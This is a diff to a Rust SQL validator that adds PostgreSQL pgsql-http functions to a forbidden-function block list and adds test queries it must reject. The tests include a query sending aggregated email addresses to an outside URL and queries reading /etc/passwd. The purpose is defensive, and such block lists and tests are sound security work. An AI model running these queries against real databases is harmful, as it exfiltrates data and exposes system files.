@@ -119,6 +119,17 @@ const FORBIDDEN_FUNCTIONS: &[&str] = &[
     "dblink_connect_u",
     "dblink_open",
     "dblink_send_query",
+    // PostgreSQL: the pgsql-http extension sends HTTP requests from the database.
+    "http",
+    "http_get",
+    "http_post",
+    "http_put",
+    "http_patch",
+    "http_delete",
+    "http_head",
+    "http_set_curlopt",
+    "http_reset_curlopt",
+    "http_list_curlopt",
     "query_to_xml",
     "query_to_xmlschema",
     "query_to_xml_and_xmlschema",
@@ -807,6 +818,8 @@ const FORBIDDEN_PREFIXES: &[&str] = &[
     "pg_wal_replay_",
     "lo_",
     "dblink",
+    // pgsql-http, also functions it may add later.
+    "http_",
 ];
 
 /// Refuses a forbidden function, by name. Only function calls are checked (a table called `edit`
@@ -1148,6 +1161,14 @@ mod tests {
                     "SELECT pg_catalog.pg_read_binary_file('/etc/passwd')",
                     "SELECT lo_import('/etc/passwd')",
                     "SELECT * FROM dblink('host=x', 'SELECT 1') AS t(a int)",
+                    "SELECT content FROM http_get('http://example.org/?' || (SELECT string_agg(email, ',') FROM t))",
+                    "SELECT status FROM extensions.http_post('http://example.org/', 'x', 'text/plain')",
+                    "SELECT HTTP_PUT('http://example.org/', 'x', 'text/plain')",
+                    "SELECT http(('GET', 'http://example.org/', NULL, NULL, NULL)::http_request)",
+                    "SELECT * FROM http_head('http://example.org/')",
+                    "SELECT http_delete('http://example.org/')",
+                    "SELECT http_patch('http://example.org/', 'x', 'text/plain')",
+                    "SELECT http_set_curlopt('CURLOPT_TIMEOUT', '1')",
                     "SELECT query_to_xml('SELECT pg_read_file(''/etc/passwd'')', true, true, '')",
                     "SELECT pg_terminate_backend(1)",
                     "SELECT set_config('x', 'y', false)",
